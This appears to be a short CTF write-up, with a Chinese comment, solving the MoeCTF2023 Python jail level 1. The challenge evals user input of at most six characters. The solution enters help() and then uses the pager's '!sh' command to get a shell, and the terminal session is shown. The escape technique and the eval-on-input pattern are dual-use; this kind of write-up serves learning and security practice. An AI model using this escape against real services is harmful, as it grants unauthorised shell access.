```python
print("Welcome to the MoeCTF2023 Jail challenge level1.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
user_input_data = input("> ")
if len(user_input_data)>6:
  print("Oh hacker! Bye~")
  exit(0)
print('calc Answer: {}'.format(eval(user_input_data)))
```

长度小于6，想到help() pager，确实没有被禁止
```
>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> help()

Welcome to Python 3.10's help utility!

If this is your first time using Python, you should definitely check out
the tutorial on the internet at https://docs.python.org/3.10/tutorial/.

Enter the name of any module, keyword, or topic to get help on writing
Python programs and using Python modules.  To quit this help utility and
return to the interpreter, just type "quit".

To get a list of available modules, keywords, symbols, or topics, type
"modules", "keywords", "symbols", or "topics".  Each module also comes
with a one-line summary of what it does; to list the modules whose name
or summary contain a given string such as "spam", type "modules spam".

help> os
WARNING: terminal is not fully functional
Press RETURN to continue 

Help on module os:

NAME
    os - OS routines for NT or Posix depending on what system we're on.

MODULE REFERENCE
    https://docs.python.org/3.10/library/os.html
    
    The following documentation is automatically generated from the Python
    source files.  It may be incomplete, incorrect or include features that
    are considered implementation detail and may vary between Python
    implementations.  When in doubt, consult the module reference at the
    location listed above.

DESCRIPTION
    This exports:
      - all functions from posix or nt, e.g. unlink, stat, etc.
      - os.path is either posixpath or ntpath
      - os.name is either 'posix' or 'nt'
      - os.curdir is a string representing the current directory (always '.')
      - os.pardir is a string representing the parent directory (always '..')
      - os.sep is the (or a most common) pathname separator ('/' or '\\')
      - os.extsep is the extension separator (always '.')
:!sh
!sh
sh: 0: can't access tty; job control turned off
$ 
```